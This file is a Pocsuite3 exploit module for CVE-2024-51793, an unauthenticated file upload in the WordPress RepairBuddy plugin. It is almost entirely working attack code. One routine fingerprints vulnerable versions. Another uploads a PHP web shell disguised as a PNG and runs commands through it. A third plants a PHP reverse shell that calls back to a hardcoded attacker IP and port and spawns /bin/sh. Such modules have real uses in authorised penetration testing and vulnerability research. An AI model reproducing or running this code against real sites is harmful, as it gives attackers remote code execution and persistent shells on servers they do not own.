import urllib3
import urllib.parse
import re
import time
from urllib.parse import urlparse
from pocsuite3.api import requests, register_poc, POCBase, OptString, Output
from collections import OrderedDict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
DEFAULT_SHELL_CODE = "<?php system($_GET['cmd']); ?>"


class RepairBuddyRCE(POCBase):
    vulID = 'CVE-2024-51793'
    version = '1.0'
    author = 'Pocsuite3'
    vulDate = '2024-11-11'
    createDate = '2025-06-30'
    updateDate = '2025-07-01'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2024-51793']
    name = 'WordPress RepairBuddy Arbitrary File Upload RCE CVE-2024-51793'
    appPowerLink = 'https://wordpress.org/plugins/computer-repair-shop/'
    appName = 'WordPress RepairBuddy Plugin'
    appVersion = '<= 3.8115'
    vulType = 'Arbitrary File Upload RCE'
    desc = 'The RepairBuddy WordPress plugin (<= 3.8115) is vulnerable to an Arbitrary File Upload vulnerability, allowing unauthenticated remote code execution via admin-ajax.php.'
    samples = []
    install_requires = []

    def __init__(self):
        super().__init__()
        self.user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"

    def _options(self): 
        o = OrderedDict()
        o['shell_code'] = OptString(default=DEFAULT_SHELL_CODE, description='Shell code to upload')
        o['cmd'] = OptString('whoami', description='Command to execute')
        # o['rhost'] = OptString('', description='Reverse shell host (e.g., attacker IP)')
        # o['rport'] = OptString('6666', description='Reverse shell port')
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/')
        readme_url = f"{url}/wp-content/plugins/computer-repair-shop/readme.txt"
        try:
            response = requests.get(readme_url, headers={'User-Agent': self.user_agent}, verify=False, timeout=10)
            if response.status_code == 200 and 'Stable tag: 3.8115' in response.text:
                result['Message'] = 'Target is vulnerable.'
                result['VerifyInfo'] = f'{url} is running vulnerable version <= 3.8115'
            else:
                result['Message'] = 'Target not vulnerable'
        except Exception as e:
            result['Message'] = f'Error vulnerable: {str(e)}'
        return self.parse_output(result)

    def _attack(self):
        result = {}
        url = self.url.rstrip('/')
        upload_url = f"{url}/wp-admin/admin-ajax.php"
        headers = {
            'User-Agent': self.user_agent,
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': f"{url}/wp-admin/post-new.php?post_type=rep_estimates",
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'multipart/form-data; boundary=---------------------------26318640401773937217773873037',
            'Origin': url,
            'Connection': 'keep-alive'
        }
        shell_code = self.get_option('shell_code')
        cmd = self.get_option('cmd')
        upload_attempts = [
            {'filename': 'nxploit.php', 'content_type': 'image/png', 'action': 'wc_upload_file_ajax', 'desc': 'nxploit.php with image/png'}
        ]

        try:
            test_response = requests.get(upload_url, params={'action': 'wc_upload_file_ajax'}, headers=headers, verify=False, timeout=10)
            if test_response.status_code != 200 and test_response.status_code != 400:
                test_response = requests.post(upload_url, headers=headers, data='action=wc_upload_file_ajax', verify=False, timeout=10)
                if test_response.status_code != 200:
                    result['Message'] = f'Error: {test_response.status_code}'
                    return self.parse_output(result)

            for attempt in upload_attempts:
                data = f"""
-----------------------------26318640401773937217773873037
Content-Disposition: form-data; name="file"; filename="{attempt['filename']}"
Content-Type: {attempt['content_type']}

{shell_code}

-----------------------------26318640401773937217773873037
Content-Disposition: form-data; name="action"

{attempt['action']}
-----------------------------26318640401773937217773873037--
"""
                response = requests.post(upload_url, headers=headers, data=data, verify=False, timeout=10)
                if response.status_code == 200:
                    shell_url = self.extract_shell_url(response.text)
                    if shell_url:
                        test_response = requests.get(shell_url, params={'cmd': cmd}, headers={'User-Agent': self.user_agent}, verify=False, timeout=10)
                        if test_response.status_code == 200 and test_response.text.strip() and '<?php' not in test_response.text:
                            result['Success'] = {
                                'Message': f'Shell upload and execute success ({attempt["desc"]})',
                                'ShellURL': shell_url,
                                'TestOutput': test_response.text.strip()
                            }
                            return self.parse_output(result)
                        else:
                            result['ShellURL'] = shell_url
                    else:
                        result['Message'] = f' URL shell error ({attempt["desc"]})'
                else:
                    result['Message'] = f'Error ({attempt["desc"]}). Status: {response.status_code}'
                if attempt is upload_attempts[-1]:
                    result['Message'] = result.get('Message', 'Error')
        except Exception as e:
            result['Message'] = f'Error upload shell: {str(e)}'

        return self.parse_output(result)

    def _shell(self):
        result = {}
        url = self.url.rstrip('/')
        upload_url = f"{url}/wp-admin/admin-ajax.php"
        headers = {
            'User-Agent': self.user_agent,
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': f"{url}/wp-admin/post-new.php?post_type=rep_estimates",
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'multipart/form-data; boundary=---------------------------26318640401773937217773873037',
            'Origin': url,
            'Connection': 'keep-alive'
        }
        rhost = self.get_option('rhost')
        if not rhost:
            rhost = '192.168.218.139'  
        rport = self.get_option('rport') or '6666'
        reverse_shell_code = f"""<?php
$sock=fsockopen("{rhost}",{rport});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>"""
        upload_attempts = [
            {'filename': 'nxploit.php', 'content_type': 'image/png', 'action': 'wc_upload_file_ajax', 'desc': 'nxploit.php with image/png'}
        ]

        try:
            test_response = requests.get(upload_url, params={'action': 'wc_upload_file_ajax'}, headers=headers, verify=False, timeout=10)
            if test_response.status_code != 200 and test_response.status_code != 400:
                test_response = requests.post(upload_url, headers=headers, data='action=wc_upload_file_ajax', verify=False, timeout=10)
                if test_response.status_code != 200:
                    result['Fail'] = {'Message': f'Error. Status: {test_response.status_code}'}
                    return self.parse_output(result)

            for attempt in upload_attempts:
                data = f"""
-----------------------------26318640401773937217773873037
Content-Disposition: form-data; name="file"; filename="{attempt['filename']}"
Content-Type: {attempt['content_type']}

{reverse_shell_code}

-----------------------------26318640401773937217773873037
Content-Disposition: form-data; name="action"

{attempt['action']}
-----------------------------26318640401773937217773873037--
"""
                response = requests.post(upload_url, headers=headers, data=data, verify=False, timeout=10)
                if response.status_code == 200:
                    shell_url = self.extract_shell_url(response.text)
                    if shell_url:
                        requests.get(shell_url + '?cmd=whoami', headers={'User-Agent': self.user_agent}, verify=False, timeout=10)
                        time.sleep(1) 
                        result['Success'] = {
                            'Message': f'Reverse shell upload success ({attempt["desc"]}). Check listener: {rhost}:{rport}',
                            'ShellURL': shell_url
                        }
                        return self.parse_output(result)
                    else:
                        result['Fail'] = {'Message': f'Failed URL reverse shell ({attempt["desc"]})'}
                else:
                    result['Fail'] = {'Message': f'Upload shell failed ({attempt["desc"]}). Status: {response.status_code}'}
                if attempt is upload_attempts[-1]:
                    result['Fail'] = result.get('Fail', {'Message': 'Upload failed.'})
        except Exception as e:
            error_message = f'Error upload reverse shell: {str(e)}'
            result['Fail'] = {'Message': error_message}

        return self.parse_output(result)

    def extract_shell_url(self, response_text):
        match = re.search(r'http[^\s"]+nxploit\.php(?:\.png)?', response_text)
        return match.group(0).replace("\\", "") if match else None

    # def parse_output(self, result):
    #     output = Output(self)
    #     if 'Success' in result:
    #         output.success(result['Success'])
    #     elif 'Message' in result and result['Message'].startswith(('Target is vulnerable.', 'Shell upload success', 'RCE executed')):
    #         output.success(result)
    #     else:
    #         output.fail(result.get('Fail', {}).get('Message', 'Exploit failed'))
    #     return output

    def parse_output(self, result):
        self.result = result
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Exploit failed')
        return output

register_poc(RepairBuddyRCE)
